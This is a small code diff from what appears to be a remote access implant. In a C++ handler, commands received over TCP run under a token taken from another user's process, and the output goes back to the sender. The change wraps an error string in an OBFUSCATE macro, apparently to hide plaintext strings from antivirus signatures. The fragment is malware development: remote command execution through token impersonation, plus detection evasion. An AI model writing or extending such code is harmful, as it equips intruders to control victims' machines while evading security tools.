@@ -16,7 +16,7 @@ void handle_shell_command_as_user(TCPClient client) {
     auto data = client.receive();
     AutoHandle token = get_token_of_user_process();
     if (token == INVALID_HANDLE_VALUE) {
-        client.send_data("Can't find a matching process?");
+        client.send_data(OBFUSCATE("Can't find a matching process?"));
         return;
     }
     const auto output = exec(*data, token);
